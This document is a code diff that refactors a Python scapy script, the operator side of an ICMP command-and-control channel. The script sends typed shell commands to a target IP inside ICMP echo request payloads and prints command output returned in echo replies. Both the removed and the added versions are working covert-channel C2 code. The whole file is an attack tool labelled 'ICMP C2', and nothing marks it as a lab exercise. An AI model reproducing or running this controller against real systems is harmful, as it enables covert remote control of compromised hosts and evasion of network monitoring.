@@ -1,51 +1,48 @@
-from scapy.all import sr,IP,ICMP,Raw,sniff 
+from scapy.all import sr,IP,ICMP,Raw,sniff
 from multiprocessing import Process
 import argparse
 
-ICMP_ID = 13170 
-time_to_live = 64
+#Variables
+ICMP_ID = int(13170)
+TTL = int(64)
 
-#checks arguments passed in by user
-parser = argparse.ArgumentParser()
-parser.add_argument('-i' '--interface', type=str, required=True, help="Listener (virtual) Network Interface eth0")
-parser.add_argument('-d', '--destination_ip', type=str, required=True, help="Destination IP adress")
-args = parser.parse_args()
-    
-def cmd(packet):
-    if packet[IP].src == args.destination_ip and packet[ICMP].type == 0 and packet[ICMP].id == ICMP_ID and packet[Raw].load:
-        icmpPacket = (packet[Raw].load).decode('utf-8', errors = 'ignore').replace('\n','')
-        print(icmpPacket)
-    else:
-        pass
-
-def start_sniff():
-    #change iface as you network may be setup differently
-    sniff(iface='eth0 ',prn=cmd, filter="icmp", store="0")
-
-def main():
-    sniffer = Process(target=start_sniff)
-    sniffer.start()
-    print("[+]ICMP C2 Started")
-    while True:
-        icmpShell = input('cmd> ')
-        if(icmpShell == 'exit'):
-            print("[+]Stopping ICMP C2")
-            sniffer.terminate()
-            break
-        elif icmpShell == '':
-            pass
-        else:
-            payload = (IP(dst=args.destination_ip, ttl = time_to_live)/ICMP(type=8, id =ICMP_ID)/Raw(load = icmpShell))
-            sr(payload, timeout =0, verbose =0)
-    sniffer.join()
-
-
-if __name__ == "__main__":
+def check_scapy():
     try:
         from scapy.all import sr,IP,ICMP,Raw,sniff
     except ImportError:
-        print('[!] Please install the python3 scapy module')
-        print('[!] use the command pip3 install scapy')
-        exit()
+        print("Install the Py3 scapy module")
 
+parser = argparse.ArgumentParser()
+parser.add_argument('-i', '--interface', type=str, required=True, help="Listener (virtual) Network Interface (e.g. eth0)")
+parser.add_argument('-d', '--destination_ip', type=str, required=True, help="Destination IP address")
+args = parser.parse_args()
+
+def sniffer():
+    sniff(iface=args.interface, prn=shell, filter="icmp", store="0")
+
+def shell(pkt):
+    if pkt[IP].src == args.destination_ip and pkt[ICMP].type == 0 and pkt[ICMP].id == ICMP_ID and pkt[Raw].load:
+        icmppacket = (pkt[Raw].load).decode('utf-8', errors='ignore').replace('\n','')
+        print(icmppacket)
+    else:
+        pass
+
+def main():
+    sniffing = Process(target=sniffer)
+    sniffing.start()
+    print("[+]ICMP C2 started!")
+    while True:
+        icmpshell = input("shell: ")
+        if icmpshell == 'exit':
+            print("[+]Stopping ICMP C2...")
+            sniffing.terminate()
+            break
+        elif icmpshell == '':
+            pass
+        else:
+            payload = (IP(dst=args.destination_ip, ttl=TTL)/ICMP(type=8,id=ICMP_ID)/Raw(load=icmpshell))
+            sr(payload, timeout=0, verbose=0)
+    sniffing.join()
+
+if __name__ == "__main__":
     main()
